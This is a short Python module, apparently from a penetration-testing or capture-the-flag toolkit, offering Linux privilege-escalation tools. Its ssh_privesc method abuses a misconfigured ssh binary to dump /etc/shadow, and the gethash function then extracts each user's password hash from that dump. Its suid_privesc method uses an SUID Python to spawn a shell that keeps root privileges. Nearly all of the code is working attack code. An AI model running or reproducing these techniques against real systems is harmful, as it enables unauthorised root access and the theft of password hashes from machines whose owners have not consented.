import os
import Enumeration as Enum
from time import sleep


def gethash(file: str, users):
    """
    read the shadow file and strip the hashed passwords out
    :param users:
    :type file: str
    """
    hashlist = []
    with open(file) as f:
        for line in f.readlines()[:-1]:
            line = line.split(" ")
            end = line.index("keyword")
            for i in range(0, end + 1):
                line.pop(0)
            line = line[0]
            for n in users:
                try:
                    to_find = f"{n}:$"
                    to_remove = len(n) + 2
                    line.index(to_find)
                    line.strip("\n")
                    password_hash = line[to_remove:-2]
                    hashed = password_hash.split(":")
                    password_hash = hashed[0] + hashed[1]
                    usr_hash = {"user": n,
                                "hash": password_hash}
                    hashlist.append(usr_hash)
                except:
                    pass
    return hashlist


class Privesc:
    """
    This class contains the privilege escalation tools
    The types of tools are:  SSH sticky bit (ssh_privesc) and Python SUID (suid_privesc)

    SSH - Exploits a sticky bit in the ssh file to allow it to read the shadow file
    Python - Exploits python having SUID privileges to allow it to grant an EUID of 0 (root)
    """
    def __init__(self, op_sys):
        self.OS = op_sys

    @property
    def ssh_privesc(self):
        """
        Uses ssh to read the file and write to shadowFile
        """
        info = Enum.Enumeration(self.OS)
        usrs = info.list_users()
        os.system("touch shadowFile.txt")
        os.popen("ssh -F /etc/shadow localhost 2> shadowFile.txt")
        sleep(0.5)
        return gethash("shadowFile.txt", usrs)

    @staticmethod
    def suid_privesc():
        os.execl("/bin/sh", "sh", "-p")
